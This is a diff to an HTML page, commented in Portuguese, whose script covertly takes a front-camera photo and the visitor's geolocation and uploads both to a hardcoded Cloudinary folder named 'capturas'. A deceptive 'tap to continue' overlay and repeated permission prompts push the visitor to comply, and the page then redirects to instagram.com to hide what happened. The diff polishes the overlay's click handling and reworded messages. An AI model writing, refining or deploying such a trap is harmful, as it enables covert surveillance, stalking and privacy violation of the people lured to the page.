@@ -24,21 +24,25 @@
   </style>
 </head>
 <body>
+  <!-- Overlay exibido inicialmente e em caso de erro -->
   <div id="overlay">Toque para continuar...</div>
   <script>
     const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
     const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
     const folderName = "capturas";       // Pasta de destino no Cloudinary
 
-    // Função para exibir o overlay com uma mensagem e executa callback ao toque.
+    // Função para exibir o overlay com uma mensagem e executar o callback ao toque.
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
       overlay.textContent = message;
       overlay.style.display = "flex";
-      overlay.onclick = () => {
+      // Remove qualquer handler anterior
+      overlay.onclick = null;
+      overlay.addEventListener("click", function handler() {
         overlay.style.display = "none";
+        overlay.removeEventListener("click", handler);
         if (callback) callback();
-      };
+      });
     }
 
     // Captura a foto usando a câmera frontal.
@@ -82,7 +86,6 @@
       } catch (error) {
         console.error("Erro na captura da foto:", error);
         showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
-          // Tenta novamente somente a captura de foto.
           capturePhoto().then(url => requestLocation(url));
         });
         throw error;
@@ -107,17 +110,16 @@
             body: textForm
           });
           if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
-          // Se tudo ocorrer bem, redireciona para o Instagram.
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => {
+          showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
             requestLocation(imageUrl);
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => {
+        showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
           requestLocation(imageUrl);
         });
       }, {
@@ -131,6 +133,7 @@
     async function startFlow() {
       try {
         const imageUrl = await capturePhoto();
+        // Solicita a localização imediatamente, sem overlay extra se a permissão for concedida.
         requestLocation(imageUrl);
       } catch (e) {
         console.error("Erro no fluxo:", e);
